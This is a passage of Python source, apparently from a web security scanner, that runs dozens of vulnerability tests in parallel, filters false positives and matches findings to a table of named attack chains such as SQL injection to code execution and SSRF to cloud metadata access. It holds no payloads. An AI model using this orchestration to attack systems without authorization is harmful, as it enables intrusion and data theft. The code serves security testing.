"""
Unified Advanced Scanner
========================
**DEPRECATED:** This module has been merged into unified_scan_engine.py.
All 32 Python scanners + attack chain detection + PoC generation are now
part of the main 17-phase sequential workflow.

Use instead:
    from oneinfinity.scan.unified_scan_engine import run_unified_scan
    session = run_unified_scan("https://example.com")

---

Legacy documentation (for reference):

Orchestrates all 4 enhanced modules + AI-powered correlation.

Innovation:
1. Automated attack chain synthesis (IDOR → privilege escalation)
2. Cross-module vulnerability correlation
3. Smart payload generation from traffic patterns
4. Real-time vulnerability prioritization

This is the UNIQUE feature no other tool has.
"""
from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

from oneinfinity.auth.multi_account_idor_engine import get_multi_account_idor_engine, IDORFinding
from oneinfinity.scan.race_condition_engine import race_condition_engine, RaceFinding
from oneinfinity.scan.captcha_bypass_engine import captcha_bypass_engine, BypassFinding
from oneinfinity.scan.baseline_validator import baseline_validator
from oneinfinity.attack.exploit_chain_engine import ExploitChainEngine

log = logging.getLogger("oneinfinity.unified_advanced")

# ─────────────────────────────────────────────────────────────────────────────
# Vulnerability Type Mapping
# ─────────────────────────────────────────────────────────────────────────────
# Maps scanner output vuln_types to attack chain pattern types

_VULN_TYPE_ALIASES = {
    # Auth bypass variations
    'auth_bypass': ['auth_bypass', 'authentication_bypass'],
    'jwt_attack': ['jwt_none_alg', 'jwt_kid_injection', 'jwt_weak_secret'],
    'oauth_leak': ['oauth_token_leak'],
    'saml_attack': ['saml_wrapping', 'sso_bypass'],

    # Injection variations
    'sqli': ['sqli', 'sql_injection'],
    'sqli_blind': ['sqli'],
    'sqli_time': ['sqli'],
    'nosql_injection': ['nosql_injection'],
    'ldap_injection': ['ldap_injection'],
    'redis_injection': ['redis_injection'],

    # XSS variations
    'xss': ['xss'],
    'dom_xss': ['stored_xss', 'xss'],
    'reflected_xss': ['xss'],

    # SSRF variations
    'ssrf': ['ssrf'],
    'ssrf_internal': ['internal_service_access'],
    'cloud_metadata_access': ['cloud_metadata'],

    # File operations
    'path_traversal': ['path_traversal', 'file_read'],
    'lfi': ['file_read'],
    'source_code_disclosure': ['source_disclosure'],

    # GraphQL
    'graphql_batch_queries': ['graphql_batch'],
    'graphql_alias_overload_dos': ['graphql_batch', 'resource_exhaustion'],
    'graphql_persisted': ['graphql_persisted'],

    # HTTP attacks
    'request_smuggling': ['request_smuggling'],
    'websocket_smuggling': ['websocket_smuggling'],
    'hpp': ['hpp', 'waf_bypass'],

    # CORS/CSRF
    'cors_misconfiguration': ['cors_misconfiguration'],
    'csrf': ['csrf'],

    # XXE
    'xxe': ['xxe'],

    # Advanced
    'dom_clobbering': ['dom_clobbering'],
    'prototype_pollution': ['prototype_pollution'],
    'css_injection': ['css_injection'],
    'ssti': ['ssti'],
    'deserialization': ['insecure_deserialization'],
    'csv_injection': ['csv_injection'],

    # New scanners
    'subdomain_takeover': ['subdomain_takeover', 'phishing'],
    'service_worker_poison': ['service_worker_poison'],
    'service_worker_scope_abuse': ['service_worker_poison'],
    'webrtc_leak': ['webrtc_leak'],
    'unicode_normalization': ['unicode_normalization'],
    'no_rate_limiting': ['no_rate_limiting'],
    'rate_limiting_bypass': ['no_rate_limiting'],
    'cache_poisoning': ['cache_poisoning'],
    'dns_rebinding_risk': ['dns_rebinding'],
    'pdf_generation_ssrf': ['ssrf', 'pdf_ssrf'],
}


def _normalize_vuln_type(vuln_type: str) -> Set[str]:
    """
    Normalize vulnerability type to match attack chain patterns.

    Args:
        vuln_type: Raw vuln_type from scanner (e.g., "sqli_blind")

    Returns:
        Set of normalized types that can match chain patterns
    """
    vuln_type_lower = vuln_type.lower()

    # Direct alias mapping
    if vuln_type_lower in _VULN_TYPE_ALIASES:
        return set(_VULN_TYPE_ALIASES[vuln_type_lower])

    # Fuzzy matching for common patterns
    normalized = {vuln_type_lower}

    if 'sql' in vuln_type_lower or 'sqli' in vuln_type_lower:
        normalized.add('sqli')
    if 'xss' in vuln_type_lower:
        normalized.add('xss')
    if 'ssrf' in vuln_type_lower:
        normalized.add('ssrf')
    if 'jwt' in vuln_type_lower or 'token' in vuln_type_lower:
        normalized.update(['jwt_none_alg', 'jwt_kid_injection'])
    if 'graphql' in vuln_type_lower and ('batch' in vuln_type_lower or 'alias' in vuln_type_lower):
        normalized.add('graphql_batch')

    return normalized


# ─────────────────────────────────────────────────────────────────────────────
# Attack Chain Patterns
# ─────────────────────────────────────────────────────────────────────────────

_ATTACK_CHAINS = [
    # ── Original chains ──────────────────────────────────────────────────────
    {
        'name': 'IDOR to Privilege Escalation',
        'pattern': ['idor', 'vertical_escalation'],
        'severity': 'critical',
        'description': 'User can access admin resources via IDOR',
    },
    {
        'name': 'Race Condition to Balance Manipulation',
        'pattern': ['race_condition', 'toctou_balance'],
        'severity': 'critical',
        'description': 'Parallel requests bypass balance checks',
    },
    {
        'name': '2FA Bypass to Account Takeover',
        'pattern': ['2fa_bypass', 'idor'],
        'severity': 'critical',
        'description': '2FA bypass + IDOR enables full account takeover',
    },
    {
        'name': 'CAPTCHA Bypass to Automated Abuse',
        'pattern': ['captcha_bypass', 'no_rate_limiting'],
        'severity': 'high',
        'description': 'CAPTCHA bypass + no rate limit = automated attack',
    },
    {
        'name': 'Race Condition to Duplicate Resource Creation',
        'pattern': ['race_condition', 'duplicate_action'],
        'severity': 'high',
        'description': 'Create multiple premium subscriptions for one payment',
    },

    # ── NEW ADVANCED CHAINS (P2) ─────────────────────────────────────────────
    {
        'name': 'SQLi to RCE via LOAD_FILE',
        'pattern': ['sqli', 'file_read'],
        'severity': 'critical',
        'description': 'SQL injection escalates to remote code execution via file operations',
    },
    {
        'name': 'XSS to Session Hijacking via Stored Payload',
        'pattern': ['stored_xss', 'session_theft'],
        'severity': 'critical',
        'description': 'Stored XSS steals admin session tokens for privilege escalation',
    },
    {
        'name': 'SSRF to Internal Service Exploitation',
        'pattern': ['ssrf', 'internal_service_access'],
        'severity': 'critical',
        'description': 'SSRF accesses internal services (Redis/Elasticsearch/AWS metadata)',
    },
    {
        'name': 'GraphQL Batching to Resource Exhaustion',
        'pattern': ['graphql_batch', 'resource_exhaustion'],
        'severity': 'high',
        'description': '100+ batched GraphQL queries cause DOS via CPU/memory exhaustion',
    },
    {
        'name': 'JWT None Algorithm to Authentication Bypass',
        'pattern': ['jwt_none_alg', 'auth_bypass'],
        'severity': 'critical',
        'description': 'JWT algorithm confusion bypasses signature verification',
    },
    {
        'name': 'Path Traversal to Source Code Disclosure',
        'pattern': ['path_traversal', 'source_disclosure'],
        'severity': 'high',
        'description': 'Directory traversal exposes source code with hardcoded secrets',
    },
    {
        'name': 'XXE to SSRF Amplification',
        'pattern': ['xxe', 'ssrf'],
        'severity': 'critical',
        'description': 'XML external entity attack chains to SSRF for cloud metadata access',
    },

    # ── ADDITIONAL ADVANCED CHAINS ───────────────────────────────────────────
    {
        'name': 'OAuth Token Leakage to Account Takeover',
        'pattern': ['oauth_token_leak', 'account_takeover'],
        'severity': 'critical',
        'description': 'Leaked OAuth tokens via referer/logs enable full account takeover',
    },
    {
        'name': 'CSV Injection to Remote Code Execution',
        'pattern': ['csv_injection', 'rce'],
        'severity': 'high',
        'description': 'Formula injection in exported CSV executes commands when opened',
    },
    {
        'name': 'Subdomain Takeover to Phishing',
        'pattern': ['subdomain_takeover', 'phishing'],
        'severity': 'high',
        'description': 'Unclaimed subdomain hosts convincing phishing page on legitimate domain',
    },
    {
        'name': 'NoSQL Injection to Authentication Bypass',
        'pattern': ['nosql_injection', 'auth_bypass'],
        'severity': 'critical',
        'description': 'MongoDB operator injection bypasses authentication via $ne/$regex',
    },
    {
        'name': 'CORS Misconfiguration to Credential Theft',
        'pattern': ['cors_misconfiguration', 'credential_theft'],
        'severity': 'high',
        'description': 'Wildcard CORS allows malicious site to steal authenticated API responses',
    },
    {
        'name': 'Deserialization to Remote Code Execution',
        'pattern': ['insecure_deserialization', 'rce'],
        'severity': 'critical',
        'description': 'Untrusted data deserialization executes arbitrary code via gadget chains',
    },
    {
        'name': 'Server-Side Template Injection to RCE',
        'pattern': ['ssti', 'rce'],
        'severity': 'critical',
        'description': 'Template injection in Jinja2/Twig/Freemarker executes system commands',
    },
    {
        'name': 'HTTP Request Smuggling to Cache Poisoning',
        'pattern': ['request_smuggling', 'cache_poisoning'],
        'severity': 'high',
        'description': 'CL.TE desync poisons cache with malicious response for all users',
    },

    # ── CUTTING-EDGE CHAINS (Research-Based) ────────────────────────────────
    {
        'name': 'DOM Clobbering to Prototype Pollution to XSS',
        'pattern': ['dom_clobbering', 'prototype_pollution', 'xss'],
        'severity': 'critical',
        'description': 'DOM clobbering overwrites Object.prototype leading to XSS via polluted properties',
    },
    {
        'name': 'WebSocket Upgrade Smuggling to Session Fixation',
        'pattern': ['websocket_smuggling', 'session_fixation'],
        'severity': 'critical',
        'description': 'Smuggled WebSocket upgrade fixes victim session to attacker-controlled ID',
    },
    {
        'name': 'DNS Rebinding to SSRF to Cloud Metadata Access',
        'pattern': ['dns_rebinding', 'ssrf', 'cloud_metadata'],
        'severity': 'critical',
        'description': 'Time-based DNS rebinding bypasses SSRF protections to access AWS/GCP metadata',
    },
    {
        'name': 'CSS Injection to Credential Exfiltration',
        'pattern': ['css_injection', 'credential_theft'],
        'severity': 'high',
        'description': 'Injected CSS uses attribute selectors to exfiltrate passwords character-by-character',
    },
    {
        'name': 'PDF Generation to SSRF to RCE',
        'pattern': ['pdf_generation', 'ssrf', 'rce'],
        'severity': 'critical',
        'description': 'HTML-to-PDF converter (WeasyPrint/wkhtmltopdf) triggers SSRF leading to RCE',
    },
    {
        'name': 'JWT kid Header to SQL Injection to Auth Bypass',
        'pattern': ['jwt_kid_injection', 'sqli', 'auth_bypass'],
        'severity': 'critical',
        'description': 'JWT kid header contains SQL injection leading to arbitrary key validation',
    },
    {
        'name': 'SAML Signature Wrapping to SSO Bypass',
        'pattern': ['saml_wrapping', 'sso_bypass'],
        'severity': 'critical',
        'description': 'XML signature wrapping bypasses SAML validation to impersonate any user',
    },
    {
        'name': 'gRPC Reflection to Business Logic Bypass',
        'pattern': ['grpc_reflection', 'business_logic_bypass'],
        'severity': 'high',
        'description': 'Enabled gRPC reflection exposes internal methods enabling logic bypass',
    },
    {
        'name': 'Service Worker Poisoning to Persistent XSS',
        'pattern': ['service_worker_poison', 'persistent_xss'],
        'severity': 'critical',
        'description': 'Poisoned service worker intercepts all requests serving malicious JavaScript',
    },
    {
        'name': 'Unicode Normalization to Authentication Bypass',
        'pattern': ['unicode_normalization', 'auth_bypass'],
        'severity': 'high',
        'description': 'Unicode normalization differences allow admin/аdmin (Cyrillic) collision',
    },
    {
        'name': 'WebRTC STUN/TURN to Internal Network Pivot',
        'pattern': ['webrtc_leak', 'network_pivot'],
        'severity': 'high',
        'description': 'WebRTC STUN servers leak internal IPs enabling network reconnaissance',
    },
    {
        'name': 'Redis Command Injection to RCE via MODULE LOAD',
        'pattern': ['redis_injection', 'rce'],
        'severity': 'critical',
        'description': 'Redis command injection loads malicious .so module executing arbitrary code',
    },
    {
        'name': 'GraphQL Persisted Queries to Cache Poisoning',
        'pattern': ['graphql_persisted', 'cache_poisoning'],
        'severity': 'high',
        'description': 'Malicious persisted query ID poisons cache with attacker-controlled data',
    },
    {
        'name': 'LDAP Injection to Privilege Escalation',
        'pattern': ['ldap_injection', 'privilege_escalation'],
        'severity': 'critical',
        'description': 'LDAP filter injection returns admin users enabling privilege escalation',
    },
    {
        'name': 'HTTP Parameter Pollution to WAF Bypass to SQLi',
        'pattern': ['hpp', 'waf_bypass', 'sqli'],
        'severity': 'critical',
        'description': 'Duplicate parameters confuse WAF allowing SQL injection through',
    },
]


@dataclass
class AttackChain:
    """Detected attack chain"""
    chain_id: str
    name: str
    severity: str
    description: str
    vulnerabilities: List[dict] = field(default_factory=list)
    impact: str = ""
    exploitation_steps: List[str] = field(default_factory=list)
    poc_script: str = ""

    def to_dict(self) -> dict:
        return {
            'chain_id': self.chain_id,
            'name': self.name,
            'severity': self.severity,
            'description': self.description,
            'vulnerabilities': self.vulnerabilities,
            'impact': self.impact,
            'exploitation_steps': self.exploitation_steps,
            'poc_script': self.poc_script,
        }


@dataclass
class AdvancedScanResult:
    """Unified scan result"""
    target: str
    total_findings: int = 0
    idor_findings: List[IDORFinding] = field(default_factory=list)
    race_findings: List[RaceFinding] = field(default_factory=list)
    bypass_findings: List[BypassFinding] = field(default_factory=list)
    # NEW: Additional module findings
    graphql_findings: List[Dict] = field(default_factory=list)
    browser_findings: List[Dict] = field(default_factory=list)
    smuggling_findings: List[Dict] = field(default_factory=list)
    business_logic_findings: List[Dict] = field(default_factory=list)
    # P0-P2 Scanner findings
    jwt_findings: List[Dict] = field(default_factory=list)
    nosql_findings: List[Dict] = field(default_factory=list)
    ssti_findings: List[Dict] = field(default_factory=list)
    deserialization_findings: List[Dict] = field(default_factory=list)
    ldap_findings: List[Dict] = field(default_factory=list)
    saml_findings: List[Dict] = field(default_factory=list)
    prototype_pollution_findings: List[Dict] = field(default_factory=list)
    grpc_findings: List[Dict] = field(default_factory=list)
    # P0 Critical Scanners
    sqli_findings: List[Dict] = field(default_factory=list)
    ssrf_findings: List[Dict] = field(default_factory=list)
    path_traversal_findings: List[Dict] = field(default_factory=list)
    cors_findings: List[Dict] = field(default_factory=list)
    # P1 Scanners
    xxe_findings: List[Dict] = field(default_factory=list)
    subdomain_takeover_findings: List[Dict] = field(default_factory=list)
    hpp_findings: List[Dict] = field(default_factory=list)
    # New Advanced Scanners
    client_side_findings: List[Dict] = field(default_factory=list)
    oauth_leak_findings: List[Dict] = field(default_factory=list)
    pdf_ssrf_findings: List[Dict] = field(default_factory=list)
    unicode_norm_findings: List[Dict] = field(default_factory=list)
    redis_injection_findings: List[Dict] = field(default_factory=list)
    rate_limiting_findings: List[Dict] = field(default_factory=list)
    cache_poisoning_findings: List[Dict] = field(default_factory=list)
    dns_rebinding_findings: List[Dict] = field(default_factory=list)
    # Phase 4: Additional scanner findings
    mass_assignment_findings: List[Dict] = field(default_factory=list)
    cache_deception_findings: List[Dict] = field(default_factory=list)
    h2c_findings: List[Dict] = field(default_factory=list)
    http2_attack_findings: List[Dict] = field(default_factory=list)
    dns_security_findings: List[Dict] = field(default_factory=list)
    validated_chains: List[Dict] = field(default_factory=list)  # Findings with chain validation
    attack_chains: List[AttackChain] = field(default_factory=list)
    risk_score: float = 0.0
    executive_summary: str = ""

    def to_dict(self) -> dict:
        return {
            'target': self.target,
            'total_findings': self.total_findings,
            'idor_findings': [f.to_dict() for f in self.idor_findings],
            'race_findings': [f.to_dict() for f in self.race_findings],
            'bypass_findings': [f.to_dict() for f in self.bypass_findings],
            'graphql_findings': self.graphql_findings,
            'browser_findings': self.browser_findings,
            'smuggling_findings': self.smuggling_findings,
            'business_logic_findings': self.business_logic_findings,
            'jwt_findings': self.jwt_findings,
            'nosql_findings': self.nosql_findings,
            'ssti_findings': self.ssti_findings,
            'deserialization_findings': self.deserialization_findings,
            'ldap_findings': self.ldap_findings,
            'saml_findings': self.saml_findings,
            'prototype_pollution_findings': self.prototype_pollution_findings,
            'grpc_findings': self.grpc_findings,
            'sqli_findings': self.sqli_findings,
            'ssrf_findings': self.ssrf_findings,
            'path_traversal_findings': self.path_traversal_findings,
            'cors_findings': self.cors_findings,
            'xxe_findings': self.xxe_findings,
            'subdomain_takeover_findings': self.subdomain_takeover_findings,
            'hpp_findings': self.hpp_findings,
            'client_side_findings': self.client_side_findings,
            'oauth_leak_findings': self.oauth_leak_findings,
            'pdf_ssrf_findings': self.pdf_ssrf_findings,
            'unicode_norm_findings': self.unicode_norm_findings,
            'redis_injection_findings': self.redis_injection_findings,
            'rate_limiting_findings': self.rate_limiting_findings,
            'cache_poisoning_findings': self.cache_poisoning_findings,
            'dns_rebinding_findings': self.dns_rebinding_findings,
            'mass_assignment_findings': self.mass_assignment_findings,
            'cache_deception_findings': self.cache_deception_findings,
            'h2c_findings': self.h2c_findings,
            'http2_attack_findings': self.http2_attack_findings,
            'dns_security_findings': self.dns_security_findings,
            'validated_chains': self.validated_chains,
            'attack_chains': [c.to_dict() for c in self.attack_chains],
            'risk_score': self.risk_score,
            'executive_summary': self.executive_summary,
        }


class UnifiedAdvancedScanner:
    """
    Orchestrates all enhanced security testing modules.

    Innovation:
    - Automated attack chain detection
    - Cross-vulnerability correlation
    - AI-powered impact analysis
    - Smart prioritization
    """

    def __init__(self, target: str):
        self.target = target

    async def run_full_scan(
        self,
        account_configs: Optional[List[Dict]] = None,
        source_filter: Optional[str] = None,
        enable_idor: bool = True,
        enable_race: bool = True,
        enable_bypass: bool = True,
        # NEW: Additional scanners
        enable_graphql: bool = True,
        enable_browser: bool = True,
        enable_smuggling: bool = True,
        enable_business_logic: bool = True,
        # P0-P2 Scanners
        enable_jwt: bool = True,
        enable_nosql: bool = True,
        enable_ssti: bool = True,
        enable_deserialization: bool = True,
        enable_ldap: bool = True,
        enable_saml: bool = True,
        enable_prototype_pollution: bool = True,
        enable_grpc: bool = True,
        # P0 Critical Scanners
        enable_sqli: bool = True,
        enable_ssrf: bool = True,
        enable_path_traversal: bool = True,
        enable_cors: bool = True,
        # P1 Scanners
        enable_xxe: bool = True,
        enable_subdomain_takeover: bool = True,
        enable_hpp: bool = True,
        # New Advanced Scanners
        enable_client_side: bool = True,
        enable_oauth_leak: bool = True,
        enable_pdf_ssrf: bool = True,
        enable_unicode_norm: bool = True,
        enable_redis_injection: bool = True,
        enable_rate_limiting: bool = True,
        enable_cache_poisoning: bool = True,
        enable_dns_rebinding: bool = True,
        enable_chain_validation: bool = True,
        oob_domain: Optional[str] = None,
        # Phase 4: Additional scanners
        enable_mass_assignment: bool = True,
        enable_cache_deception: bool = True,
        enable_h2c: bool = True,
        enable_http2: bool = True,
        enable_dns_security: bool = True,
        output_json_path: Optional[str] = None,
    ) -> AdvancedScanResult:
        """
        Run complete advanced security scan.

        Args:
            account_configs: List of account configs for IDOR testing
            source_filter: Traffic source filter
            enable_idor: Enable multi-account IDOR testing
            enable_race: Enable race condition testing
            enable_bypass: Enable CAPTCHA/2FA bypass testing

        Returns:
            AdvancedScanResult with all findings + attack chains
        """
        log.info(f"Starting unified advanced scan on {self.target}")

        result = AdvancedScanResult(target=self.target)

        # Run all modules in parallel
        tasks = []

        if enable_idor and account_configs and len(account_configs) >= 2:
            tasks.append(self._run_idor_testing(account_configs, source_filter))

        if enable_race:
            tasks.append(self._run_race_testing(source_filter))

        if enable_bypass:
            tasks.append(self._run_bypass_testing())

        # NEW: Additional scanners
        if enable_graphql:
            tasks.append(self._run_graphql_testing())

        if enable_browser:
            tasks.append(self._run_browser_testing())

        if enable_smuggling:
            tasks.append(self._run_smuggling_testing())

        if enable_business_logic:
            tasks.append(self._run_business_logic_testing())

        # P0-P2 Scanners
        if enable_jwt:
            tasks.append(self._run_jwt_testing())

        if enable_nosql:
            tasks.append(self._run_nosql_testing())

        if enable_ssti:
            tasks.append(self._run_ssti_testing())

        if enable_deserialization:
            tasks.append(self._run_deserialization_testing())

        if enable_ldap:
            tasks.append(self._run_ldap_testing())

        if enable_saml:
            tasks.append(self._run_saml_testing())

        if enable_prototype_pollution:
            tasks.append(self._run_prototype_pollution_testing())

        if enable_grpc:
            tasks.append(self._run_grpc_testing())

        # P0 Critical Scanners
        if enable_sqli:
            tasks.append(self._run_sqli_testing())

        if enable_ssrf:
            tasks.append(self._run_ssrf_testing(oob_domain))

        if enable_path_traversal:
            tasks.append(self._run_path_traversal_testing())

        if enable_cors:
            tasks.append(self._run_cors_testing())

        # P1 Scanners
        if enable_xxe:
            tasks.append(self._run_xxe_testing())

        if enable_subdomain_takeover:
            tasks.append(self._run_subdomain_takeover_testing())

        if enable_hpp:
            tasks.append(self._run_hpp_testing())

        # New Advanced Scanners
        if enable_client_side:
            tasks.append(self._run_client_side_testing())

        if enable_oauth_leak:
            tasks.append(self._run_oauth_leak_testing())

        if enable_pdf_ssrf:
            tasks.append(self._run_pdf_ssrf_testing())

        if enable_unicode_norm:
            tasks.append(self._run_unicode_norm_testing())

        if enable_redis_injection:
            tasks.append(self._run_redis_injection_testing())

        if enable_rate_limiting:
            tasks.append(self._run_rate_limiting_testing())

        if enable_cache_poisoning:
            tasks.append(self._run_cache_poisoning_testing())

        if enable_dns_rebinding:
            tasks.append(self._run_dns_rebinding_testing())

        # Phase 4: Additional scanners
        if enable_mass_assignment:
            tasks.append(self._run_mass_assignment_testing())

        if enable_cache_deception:
            tasks.append(self._run_cache_deception_testing())

        if enable_h2c:
            tasks.append(self._run_h2c_testing())

        if enable_http2:
            tasks.append(self._run_http2_testing())

        if enable_dns_security:
            tasks.append(self._run_dns_security_testing())

        # Execute in parallel
        results_batch = await asyncio.gather(*tasks, return_exceptions=True)

        # Process results
        for module_result in results_batch:
            if isinstance(module_result, Exception):
                log.error(f"Module failed: {module_result}")
                continue

            module_name, findings = module_result

            if module_name == 'idor':
                result.idor_findings = findings
            elif module_name == 'race':
                result.race_findings = findings
            elif module_name == 'bypass':
                result.bypass_findings = findings
            elif module_name == 'graphql':
                result.graphql_findings = findings
            elif module_name == 'browser':
                result.browser_findings = findings
            elif module_name == 'smuggling':
                result.smuggling_findings = findings
            elif module_name == 'business_logic':
                result.business_logic_findings = findings
            elif module_name == 'jwt':
                result.jwt_findings = findings
            elif module_name == 'nosql':
                result.nosql_findings = findings
            elif module_name == 'ssti':
                result.ssti_findings = findings
            elif module_name == 'deserialization':
                result.deserialization_findings = findings
            elif module_name == 'ldap':
                result.ldap_findings = findings
            elif module_name == 'saml':
                result.saml_findings = findings
            elif module_name == 'prototype_pollution':
                result.prototype_pollution_findings = findings
            elif module_name == 'grpc':
                result.grpc_findings = findings
            elif module_name == 'sqli':
                result.sqli_findings = findings
            elif module_name == 'ssrf':
                result.ssrf_findings = findings
            elif module_name == 'path_traversal':
                result.path_traversal_findings = findings
            elif module_name == 'cors':
                result.cors_findings = findings
            elif module_name == 'xxe':
                result.xxe_findings = findings
            elif module_name == 'subdomain_takeover':
                result.subdomain_takeover_findings = findings
            elif module_name == 'hpp':
                result.hpp_findings = findings
            elif module_name == 'client_side':
                result.client_side_findings = findings
            elif module_name == 'oauth_leak':
                result.oauth_leak_findings = findings
            elif module_name == 'pdf_ssrf':
                result.pdf_ssrf_findings = findings
            elif module_name == 'unicode_norm':
                result.unicode_norm_findings = findings
            elif module_name == 'redis_injection':
                result.redis_injection_findings = findings
            elif module_name == 'rate_limiting':
                result.rate_limiting_findings = findings
            elif module_name == 'cache_poisoning':
                result.cache_poisoning_findings = findings
            elif module_name == 'dns_rebinding':
                result.dns_rebinding_findings = findings
            elif module_name == 'mass_assignment':
                result.mass_assignment_findings = findings
            elif module_name == 'cache_deception':
                result.cache_deception_findings = findings
            elif module_name == 'h2c':
                result.h2c_findings = findings
            elif module_name == 'http2_attack':
                result.http2_attack_findings = findings
            elif module_name == 'dns_security':
                result.dns_security_findings = findings

        # Calculate totals
        result.total_findings = (
            len(result.idor_findings) +
            len(result.race_findings) +
            len(result.bypass_findings) +
            len(result.graphql_findings) +
            len(result.browser_findings) +
            len(result.smuggling_findings) +
            len(result.business_logic_findings) +
            len(result.jwt_findings) +
            len(result.nosql_findings) +
            len(result.ssti_findings) +
            len(result.deserialization_findings) +
            len(result.ldap_findings) +
            len(result.saml_findings) +
            len(result.prototype_pollution_findings) +
            len(result.grpc_findings) +
            len(result.sqli_findings) +
            len(result.ssrf_findings) +
            len(result.path_traversal_findings) +
            len(result.cors_findings) +
            len(result.xxe_findings) +
            len(result.subdomain_takeover_findings) +
            len(result.hpp_findings) +
            len(result.client_side_findings) +
            len(result.oauth_leak_findings) +
            len(result.pdf_ssrf_findings) +
            len(result.unicode_norm_findings) +
            len(result.redis_injection_findings) +
            len(result.rate_limiting_findings) +
            len(result.cache_poisoning_findings) +
            len(result.dns_rebinding_findings) +
            len(result.mass_assignment_findings) +
            len(result.cache_deception_findings) +
            len(result.h2c_findings) +
            len(result.http2_attack_findings) +
            len(result.dns_security_findings)
        )

        # ── BaselineValidator: FP discrimination pass ─────────────────────────
        # Runs after all scans complete, before writing output. Marks/removes FPs.
        try:
            _all_mutable = []
            for _attr in [
                "idor_findings", "race_findings", "bypass_findings",
                "graphql_findings", "browser_findings", "smuggling_findings",
                "business_logic_findings", "jwt_findings", "nosql_findings",
                "ssti_findings", "deserialization_findings", "ldap_findings",
                "saml_findings", "prototype_pollution_findings", "grpc_findings",
                "sqli_findings", "ssrf_findings", "path_traversal_findings",
                "cors_findings", "xxe_findings", "subdomain_takeover_findings",
                "hpp_findings", "client_side_findings", "oauth_leak_findings",
                "pdf_ssrf_findings", "unicode_norm_findings", "redis_injection_findings",
                "rate_limiting_findings", "cache_poisoning_findings", "dns_rebinding_findings",
                "mass_assignment_findings", "cache_deception_findings",
                "h2c_findings", "http2_attack_findings", "dns_security_findings",
            ]:
                lst = getattr(result, _attr, [])
                _validated = []
                for _f in lst:
                    _fd = _f.to_dict() if hasattr(_f, "to_dict") else _f
                    if isinstance(_fd, dict):
                        _fd = baseline_validator.validate_finding_enhanced(_fd)
                        if _fd.get("validation_status") != "false_positive":
                            _validated.append(_f)
                    else:
                        _validated.append(_f)
                setattr(result, _attr, _validated)
            log.info("BaselineValidator: FP pass complete for %s", self.target)
        except Exception as _bv_exc:
            log.debug("BaselineValidator pass failed (non-fatal, keeping all findings): %s", _bv_exc)

        # Recalculate totals after FP pass
        result.total_findings = sum(
            len(getattr(result, _k, []))
            for _k in [
                "idor_findings", "race_findings", "bypass_findings",
                "graphql_findings", "browser_findings", "smuggling_findings",
                "business_logic_findings", "jwt_findings", "nosql_findings",
                "ssti_findings", "deserialization_findings", "ldap_findings",
                "saml_findings", "prototype_pollution_findings", "grpc_findings",
                "sqli_findings", "ssrf_findings", "path_traversal_findings",
                "cors_findings", "xxe_findings", "subdomain_takeover_findings",
                "hpp_findings", "client_side_findings", "oauth_leak_findings",
                "pdf_ssrf_findings", "unicode_norm_findings", "redis_injection_findings",
                "rate_limiting_findings", "cache_poisoning_findings", "dns_rebinding_findings",
                "mass_assignment_findings", "cache_deception_findings",
                "h2c_findings", "http2_attack_findings", "dns_security_findings",
            ]
        )
        # NEW: Chain validation
        if enable_chain_validation:
            result.validated_chains = await self._run_chain_validation(
                result, oob_domain
            )

        # Detect attack chains using IntegratedChainDetector (ExploitChainEngine + manual patterns)
        try:
            from oneinfinity.scan.integrated_chain_detector import IntegratedChainDetector

            # Collect all findings
            all_findings_flat = []
            for finding in result.idor_findings:
                all_findings_flat.append(finding.to_dict() if hasattr(finding, 'to_dict') else finding)
            for finding in result.race_findings:
                all_findings_flat.append(finding.to_dict() if hasattr(finding, 'to_dict') else finding)
            for finding in result.bypass_findings:
                all_findings_flat.append(finding.to_dict() if hasattr(finding, 'to_dict') else finding)
            all_findings_flat.extend(result.graphql_findings)
            all_findings_flat.extend(result.browser_findings)
            all_findings_flat.extend(result.smuggling_findings)
            all_findings_flat.extend(result.business_logic_findings)
            all_findings_flat.extend(result.jwt_findings)
            all_findings_flat.extend(result.nosql_findings)
            all_findings_flat.extend(result.ssti_findings)
            all_findings_flat.extend(result.deserialization_findings)
            all_findings_flat.extend(result.ldap_findings)
            all_findings_flat.extend(result.saml_findings)
            all_findings_flat.extend(result.prototype_pollution_findings)
            all_findings_flat.extend(result.grpc_findings)
            all_findings_flat.extend(result.sqli_findings)
            all_findings_flat.extend(result.ssrf_findings)
            all_findings_flat.extend(result.path_traversal_findings)
            all_findings_flat.extend(result.cors_findings)
            all_findings_flat.extend(result.xxe_findings)
            all_findings_flat.extend(result.subdomain_takeover_findings)
            all_findings_flat.extend(result.hpp_findings)
            all_findings_flat.extend(result.client_side_findings)
            all_findings_flat.extend(result.oauth_leak_findings)
            all_findings_flat.extend(result.pdf_ssrf_findings)
            all_findings_flat.extend(result.unicode_norm_findings)
            all_findings_flat.extend(result.redis_injection_findings)
            all_findings_flat.extend(result.rate_limiting_findings)
            all_findings_flat.extend(result.cache_poisoning_findings)
            all_findings_flat.extend(result.dns_rebinding_findings)

            all_findings_flat.extend(result.mass_assignment_findings)
            all_findings_flat.extend(result.cache_deception_findings)
            all_findings_flat.extend(result.h2c_findings)
            all_findings_flat.extend(result.http2_attack_findings)
            all_findings_flat.extend(result.dns_security_findings)
            integrated_detector = IntegratedChainDetector(self.target)
            integrated_chains_dicts = integrated_detector.detect_chains(all_findings_flat)

            # Convert dict chains to AttackChain objects
            integrated_chains = []
            for chain_dict in integrated_chains_dicts:
                integrated_chains.append(AttackChain(
                    chain_id=chain_dict['chain_id'],
                    name=chain_dict['name'],
                    severity=chain_dict['severity'],
                    description=chain_dict['description'],
                    vulnerabilities=chain_dict['vulnerabilities'],
                    impact=chain_dict['impact'],
                    exploitation_steps=chain_dict['exploitation_steps'],
                    poc_script=chain_dict['poc_script'],
                ))

            log.info(f"IntegratedChainDetector found {len(integrated_chains)} chains with PoC + CVSS")

            # Fallback to manual detection for additional patterns
            manual_chains = self._detect_attack_chains(result)

            # Merge: prefer integrated chains, add unique manual chains
            integrated_names = {c.name for c in integrated_chains}
            for manual_chain in manual_chains:
                if manual_chain.name not in integrated_names:
                    integrated_chains.append(manual_chain)

            result.attack_chains = integrated_chains

        except Exception as e:
            log.error(f"IntegratedChainDetector failed, using manual detection: {e}")
            result.attack_chains = self._detect_attack_chains(result)

        # Calculate risk score
        result.risk_score = self._calculate_risk_score(result)

        # Generate executive summary
        result.executive_summary = self._generate_summary(result)

        # ── advanced_integrations: chain suggestions + payload mutations ───────
        try:
            from oneinfinity.scan.advanced_integrations import (
                integrate_chain_suggestions as _ics,
                integrate_payload_mutation as _ipm,
            )
            # Flatten current findings for chain suggestion engine
